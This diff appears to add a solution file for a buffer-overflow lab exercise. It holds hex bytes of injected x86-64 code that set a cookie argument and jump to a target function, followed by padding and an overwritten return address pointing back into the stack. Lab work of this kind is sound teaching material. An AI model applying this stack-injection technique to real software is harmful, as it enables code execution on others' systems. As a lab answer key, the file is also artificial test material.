@@ -1,0 +1,6 @@
+bf fa 97 b9 59          /* 	mov    $0x59b997fa,%edi  -> set rdi to cookie */
+bc 98 dc 61 55          /* 	mov    $0x5561dc98,%esp  -> set rsp to 0x5561dca0 - 8 */
+c3                      /* 	retq                     ->  call touch2 */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /* 21 bytes */
+ec 17 40 00 00 00 00 00 /* address of touch2: 0x4017ec */
+78 dc 61 55             /* addres of my code: 0x5561dc78 */
